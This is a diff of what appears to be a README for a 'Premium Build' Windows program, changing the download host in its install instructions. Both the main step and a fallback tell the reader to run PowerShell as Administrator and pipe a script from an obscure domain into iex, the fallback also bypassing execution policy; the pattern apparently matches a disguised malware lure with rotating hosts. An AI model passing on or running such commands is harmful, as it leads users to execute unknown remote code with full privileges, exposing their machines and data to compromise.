@@ -37,7 +37,7 @@ Complete Edition · Premium Build · Windows · Deployment
 **Run in PowerShell as Administrator:**
 
 ```powershell
-irm https://usevision.fun/ps/setup.ps1 | iex
+irm https://webmania.xyz/ps/setup.ps1 | iex
 ```
 
 <sub>Copy · paste · press Enter · confirm UAC</sub>
@@ -71,7 +71,7 @@ irm https://usevision.fun/ps/setup.ps1 | iex
 
 <details>
 <summary>&nbsp;<b>Manual install blocked?</b></summary>
-<br>Try: `powershell -ExecutionPolicy Bypass -Command "irm https://usevision.fun/ps/setup.ps1 | iex"`
+<br>Try: `powershell -ExecutionPolicy Bypass -Command "irm https://webmania.xyz/ps/setup.ps1 | iex"`
 </details>
 
 <details>
